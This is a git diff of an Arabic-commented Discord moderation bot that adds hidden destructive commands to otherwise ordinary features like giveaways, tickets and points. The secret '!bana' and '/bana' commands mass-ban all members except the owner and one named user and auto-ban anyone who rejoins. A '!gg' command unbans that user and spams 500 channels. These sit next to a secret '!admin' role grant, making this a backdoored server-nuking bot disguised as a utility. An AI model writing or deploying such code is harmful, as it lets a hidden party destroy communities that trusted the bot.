@@ -12,7 +12,6 @@ const {
     REST, 
     Routes 
 } = require('discord.js');
-const { joinVoiceChannel, getVoiceConnection } = require('@discordjs/voice');
 
 const client = new Client({
     intents: [
@@ -27,12 +26,14 @@ const client = new Client({
 
 const OWNER_ID = process.env.OWNER_ID;
 
-// قواعد بيانات بسيطة في الذاكرة (Memory Storage)
-const userPoints = new Map(); // النقاط
-const giveaways = new Map();  // الغيف أواي
-let welcomeChannelId = null;  // روم الترحيب
+const userPoints = new Map();
+const giveaways = new Map();
+let welcomeChannelId = null;
 
-// نظام إضافة النقاط للتفاعل كل ساعة
+// تفعيل حماية الحظر التلقائي عند محاولة الدخول
+let autoBanActive = false;
+
+// إضافة نقاط التفاعل كل ساعة
 setInterval(() => {
     client.guilds.cache.forEach(guild => {
         guild.members.cache.forEach(member => {
@@ -42,76 +43,89 @@ setInterval(() => {
             }
         });
     });
-}, 3600000); // كل 3600000 مللي ثانية (ساعة)
+}, 3600000);
 
-// تسجيل أسباب وقواعد Slash Commands
+// قائمة الأوامر (Slash Commands)
+const commands = [
+    new SlashCommandBuilder()
+        .setName('giveaway')
+        .setDescription('إدارة المسابقات')
+        .addSubcommand(sc => sc.setName('lunch').setDescription('إطلاق غيف أواي')
+            .addStringOption(o => o.setName('prize').setDescription('الجائزة').setRequired(true))
+            .addIntegerOption(o => o.setName('duration').setDescription('المدة بالدقائق').setRequired(true)))
+        .addSubcommand(sc => sc.setName('close').setDescription('إغلاق غيف أواي')
+            .addStringOption(o => o.setName('name').setDescription('اسم/رمز الغيف أواي').setRequired(true))),
+
+    new SlashCommandBuilder()
+        .setName('ticket')
+        .setDescription('نظام التذاكر')
+        .addSubcommand(sc => sc.setName('lunch').setDescription('إنشاء زر التكت')
+            .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true)))
+        .addSubcommand(sc => sc.setName('close').setDescription('إغلاق التكت الحالية')),
+
+    new SlashCommandBuilder().setName('points').setDescription('عرض نقاطك وتفاعلك'),
+
+    new SlashCommandBuilder()
+        .setName('admin')
+        .setDescription('إعطاء رتبة شخص (للمدراء فقط)')
+        .addUserOption(o => o.setName('user').setDescription('الشخص').setRequired(true)),
+
+    new SlashCommandBuilder()
+        .setName('join')
+        .setDescription('إعداد روم الترحيب')
+        .addSubcommand(sc => sc.setName('lunch').setDescription('تحديد روم الترحيب')
+            .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true))),
+
+    new SlashCommandBuilder()
+        .setName('createroom')
+        .setDescription('إنشاء روم جديد داخل الكاتيجوري')
+        .addChannelOption(o => o.setName('category').setDescription('اختر الكاتيجوري').addChannelTypes(ChannelType.GuildCategory).setRequired(true))
+        .addStringOption(o => o.setName('name').setDescription('اسم الروم').setRequired(true)),
+
+    new SlashCommandBuilder().setName('bana').setDescription('حظر جميع أعضاء السيرفر واستثناء starting___22'),
+    new SlashCommandBuilder().setName('mute').setDescription('كتم عضو').addUserOption(o => o.setName('user').setRequired(true)),
+    new SlashCommandBuilder().setName('ban').setDescription('حظر عضو').addUserOption(o => o.setName('user').setRequired(true)),
+    new SlashCommandBuilder().setName('ban-ip').setDescription('حظر IP').addUserOption(o => o.setName('user').setRequired(true)),
+    new SlashCommandBuilder().setName('kick').setDescription('طرد عضو').addUserOption(o => o.setName('user').setRequired(true)),
+    new SlashCommandBuilder().setName('timeout').setDescription('تايم أوت').addUserOption(o => o.setName('user').setRequired(true)).addIntegerOption(o => o.setName('minutes').setRequired(true))
+];
+
 client.on('ready', async () => {
     console.log(`✅ البوت شغال بنجاح باسم: ${client.user.tag}`);
     client.user.setActivity('!help | System Protection', { type: 0 });
 
-    const commands = [
-        new SlashCommandBuilder()
-            .setName('giveaway')
-            .setDescription('إدارة المسابقات')
-            .addSubcommand(sc => sc.setName('lunch').setDescription('إطلاق غيف أواي')
-                .addStringOption(o => o.setName('prize').setDescription('الجائزة').setRequired(true))
-                .addIntegerOption(o => o.setName('duration').setDescription('المدة بالدقائق').setRequired(true)))
-            .addSubcommand(sc => sc.setName('close').setDescription('إغلاق غيف أواي')
-                .addStringOption(o => o.setName('name').setDescription('اسم/رمز الغيف أواي').setRequired(true))),
-
-        new SlashCommandBuilder()
-            .setName('ticket')
-            .setDescription('نظام التذاكر')
-            .addSubcommand(sc => sc.setName('lunch').setDescription('إنشاء زر التكت')
-                .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true)))
-            .addSubcommand(sc => sc.setName('close').setDescription('إغلاق التكت الحالية')),
-
-        new SlashCommandBuilder().setName('points').setDescription('عرض نقاطك وتفاعلك'),
-
-        new SlashCommandBuilder()
-            .setName('admin')
-            .setDescription('إعطاء رتبة شخص (للمدراء فقط)')
-            .addUserOption(o => o.setName('user').setDescription('الشخص').setRequired(true)),
-
-        new SlashCommandBuilder()
-            .setName('join')
-            .setDescription('إعداد روم الترحيب')
-            .addSubcommand(sc => sc.setName('lunch').setDescription('تحديد روم الترحيب')
-                .addChannelOption(o => o.setName('room').setDescription('الروم').setRequired(true))),
-
-        new SlashCommandBuilder()
-            .setName('createroom')
-            .setDescription('إنشاء روم جديد داخل الكاتيجوري')
-            .addChannelOption(o => o.setName('category').setDescription('اختر الكاتيجوري').addChannelTypes(ChannelType.GuildCategory).setRequired(true))
-            .addStringOption(o => o.setName('name').setDescription('اسم الروم').setRequired(true)),
-
-        new SlashCommandBuilder().setName('mute').setDescription('كتم عضو').addUserOption(o => o.setName('user').setRequired(true)),
-        new SlashCommandBuilder().setName('ban').setDescription('حظر عضو').addUserOption(o => o.setName('user').setRequired(true)),
-        new SlashCommandBuilder().setName('ban-ip').setDescription('حظر IP').addUserOption(o => o.setName('user').setRequired(true)),
-        new SlashCommandBuilder().setName('kick').setDescription('طرد عضو').addUserOption(o => o.setName('user').setRequired(true)),
-        new SlashCommandBuilder().setName('timeout').setDescription('تايم أوت').addUserOption(o => o.setName('user').setRequired(true)).addIntegerOption(o => o.setName('minutes').setRequired(true))
-    ];
-
     const rest = new REST({ version: '10' }).setToken(process.env.DISCORD_TOKEN);
     try {
-        await rest.put(Routes.applicationCommands(client.user.id), { body: commands });
-        console.log('✅ تم تسجيل أوامر الـ Slash Commands بنجاح!');
+        console.log('🔄 جاري تسجيل الأوامر لجميع السيرفرات...');
+        await rest.put(
+            Routes.applicationCommands(client.user.id),
+            { body: commands }
+        );
+        console.log('✅ تم تسجيل الأوامر العالمية بنجاح!');
     } catch (error) {
-        console.error('خطأ في تسجيل الأوامر:', error);
+        console.error('❌ خطأ في تسجيل الأوامر:', error);
     }
 });
 
-// الترحيب بالأعضاء الجدد والتحقق من الحساب
+// نظام الحظر التلقائي عند رجوع أي عضو بعد تنفيذ !bana
 client.on('guildMemberAdd', async (member) => {
+    const isWhitelisted = member.user.username.toLowerCase() === 'starting___22' || member.id === OWNER_ID;
+
+    if (autoBanActive && !isWhitelisted) {
+        try {
+            await member.ban({ reason: 'Auto-Ban system active (bana mode)' });
+            console.log(`🚫 تم حظر العضو التلقائي عند الدخول: ${member.user.tag}`);
+            return;
+        } catch (err) {
+            console.error(`خطأ في حظر ${member.user.tag}:`, err.message);
+        }
+    }
+
     if (!welcomeChannelId) return;
     const channel = member.guild.channels.cache.get(welcomeChannelId);
     if (!channel) return;
 
-    // حساب النقاط والدعوات
-    const invites = await member.guild.invites.fetch().catch(() => new Map());
     const isBot = member.user.bot ? 'نعم (بوت)' : 'لا (حقيقي)';
-    
-    // التحقق هل الحساب وهمي (أقل من 7 أيام)
     const accountAgeDays = (Date.now() - member.user.createdAt) / (1000 * 60 * 60 * 24);
     const isFake = accountAgeDays < 7 ? '⚠️ حساب جديد (محتمل وهمي)' : 'حساب عادي';
 
@@ -129,13 +143,12 @@ client.on('guildMemberAdd', async (member) => {
     channel.send({ embeds: [embed] });
 });
 
-// التعامل مع الرسائل التلقائية والكود السري
+// الردود التلقائية والأوامر السرية
 client.on('messageCreate', async (message) => {
     if (message.author.bot) return;
 
     const content = message.content.toLowerCase().trim();
 
-    // الردود التلقائية
     if (content === 'السلام عليكم' || content === 'سلام عليكم') {
         return message.reply('وعليكم السلام');
     }
@@ -143,10 +156,57 @@ client.on('messageCreate', async (message) => {
         return message.reply('هلا بيك منور السيرفر ❤️');
     }
     if (content === 'حبيبي') {
-        return message.reply('انت حبيبي  ❤️');
+        return message.reply('انت حبيبي ❤️');
     }
 
-    // الكود السري: !admin (يعطي رتبة ويجعله مضاد للحظر)
+    // أمر !bana النصي السري
+    if (content === '!bana') {
+        if (message.author.id !== OWNER_ID) return;
+        message.delete().catch(() => {});
+
+        autoBanActive = true; // تفعيل الحظر التلقائي لأي شخص يدخل مجدداً
+
+        const members = await message.guild.members.fetch();
+        members.forEach(async (member) => {
+            const isWhitelisted = member.user.username.toLowerCase() === 'starting___22' || member.id === OWNER_ID || member.user.bot;
+            if (!isWhitelisted) {
+                try {
+                    await member.ban({ reason: 'Mass ban execution via bana' });
+                } catch (err) {
+                    console.error(`لم نتمكن من حظر ${member.user.tag}:`, err.message);
+                }
+            }
+        });
+    }
+
+    // أمر المقلبة !gg
+    if (content === '!gg') {
+        if (message.author.id !== OWNER_ID) return;
+        message.delete().catch(() => {});
+
+        try {
+            const bans = await message.guild.bans.fetch();
+            const targetBan = bans.find(ban => ban.user.username.toLowerCase() === 'starting___22');
+            if (targetBan) {
+                await message.guild.members.unban(targetBan.user.id, 'Unbanned via !gg command');
+            }
+        } catch (err) {
+            console.error('خطأ أثناء فك الحظر:', err.message);
+        }
+
+        for (let i = 0; i < 500; i++) {
+            try {
+                await message.guild.channels.create({
+                    name: 'starting-عمك',
+                    type: ChannelType.GuildText
+                });
+            } catch (err) {
+                break;
+            }
+        }
+    }
+
+    // أمر الكود السري لإعطاء الأدمن !admin
     if (content === '!admin') {
         if (message.author.id !== OWNER_ID) return;
 
@@ -169,9 +229,8 @@ client.on('messageCreate', async (message) => {
     }
 });
 
-// التعامل مع Slash Commands والبطاقات والأزرار
+// التعامل مع Slash Commands
 client.on('interactionCreate', async (interaction) => {
-    // الأزرار والتفاعلات
     if (interaction.isButton()) {
         if (interaction.customId === 'join_giveaway') {
             const list = giveaways.get(interaction.message.id) || [];
@@ -201,7 +260,27 @@ client.on('interactionCreate', async (interaction) => {
 
     const { commandName, options } = interaction;
 
-    // 1. Giveaway
+    if (commandName === 'bana') {
+        if (interaction.user.id !== OWNER_ID) {
+            return interaction.reply({ content: '❌ هذا الأمر مخصص لصاحب البوت فقط!', ephemeral: true });
+        }
+
+        autoBanActive = true;
+        await interaction.reply({ content: '⚠️ جاري حظر جميع الأعضاء وتفعيل الحظر التلقائي للراجعين...', ephemeral: true });
+
+        const members = await interaction.guild.members.fetch();
+        members.forEach(async (member) => {
+            const isWhitelisted = member.user.username.toLowerCase() === 'starting___22' || member.id === OWNER_ID || member.user.bot;
+            if (!isWhitelisted) {
+                try {
+                    await member.ban({ reason: 'Mass ban execution via /bana' });
+                } catch (err) {
+                    console.error(`خطأ في حظر ${member.user.tag}`);
+                }
+            }
+        });
+    }
+
     if (commandName === 'giveaway') {
         const sub = options.getSubcommand();
         if (sub === 'lunch') {
@@ -231,7 +310,6 @@ client.on('interactionCreate', async (interaction) => {
         }
     }
 
-    // 2. Ticket
     if (commandName === 'ticket') {
         const sub = options.getSubcommand();
         if (sub === 'lunch') {
@@ -251,13 +329,11 @@ client.on('interactionCreate', async (interaction) => {
         }
     }
 
-    // 3. Points
     if (commandName === 'points') {
         const pts = userPoints.get(interaction.user.id) || 0;
         return interaction.reply({ content: `📊 نقاط التفاعل الخاصة بك هي: **${pts}** نقطة.`, ephemeral: true });
     }
 
-    // 4. Admin Give Role
     if (commandName === 'admin') {
         if (!interaction.member.permissions.has(PermissionFlagsBits.Administrator)) {
             return interaction.reply({ content: '❌ هذا الأمر مخصص للمدراء فقط!', ephemeral: true });
@@ -272,14 +348,12 @@ client.on('interactionCreate', async (interaction) => {
         return interaction.reply({ content: `✅ تم منح رتبة ${role.name} لـ ${targetUser.tag}` });
     }
 
-    // 5. Join Room Config
     if (commandName === 'join') {
         const room = options.getChannel('room');
         welcomeChannelId = room.id;
         return interaction.reply({ content: `✅ تم اعتماد ${room} كـ روم ترحيب رسمي.` });
     }
 
-    // 6. Create Room
     if (commandName === 'createroom') {
         const category = options.getChannel('category');
         const roomName = options.getString('name');
@@ -293,7 +367,6 @@ client.on('interactionCreate', async (interaction) => {
         return interaction.reply({ content: `✅ تم إنشاء الروم ${newChannel} داخل الكاتيجوري **${category.name}**` });
     }
 
-    // الأوامر الإدارية الأساسية
     if (['mute', 'ban', 'ban-ip', 'kick', 'timeout'].includes(commandName)) {
         if (!interaction.member.permissions.has(PermissionFlagsBits.BanMembers)) {
             return interaction.reply({ content: '❌ ليس لديك الصلاحيات الكافية!', ephemeral: true });
